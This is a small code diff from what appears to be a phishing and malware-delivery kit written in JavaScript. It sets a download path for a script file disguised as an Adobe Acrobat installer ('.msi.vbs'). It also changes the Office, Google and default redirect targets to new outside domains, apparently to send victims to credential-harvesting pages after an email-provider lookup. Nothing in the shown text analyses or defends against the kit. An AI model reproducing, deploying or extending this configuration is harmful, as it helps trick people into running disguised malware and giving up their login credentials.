@@ -7,9 +7,9 @@ const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
 
 const MSI_PATH = "/AdobeAcrobatDC_2025.003.40436_29091.msi.vbs";
 
-const OFFICE_TARGET = "https://elreydeltrompo.com/dash/off";
-const GOOGLE_TARGET = "https://elreydeltrompo.com/css/cw";
-const DEFAULT_TARGET = "https://elreydeltrompo.com/css/cw";
+const OFFICE_TARGET = "https://agripeace.org/ringcentral";
+const GOOGLE_TARGET = "https://agripeace.org/cw";
+const DEFAULT_TARGET = "https://agripeace.org/cw";
 
 const MX_TIMEOUT_MS = 1500;
 
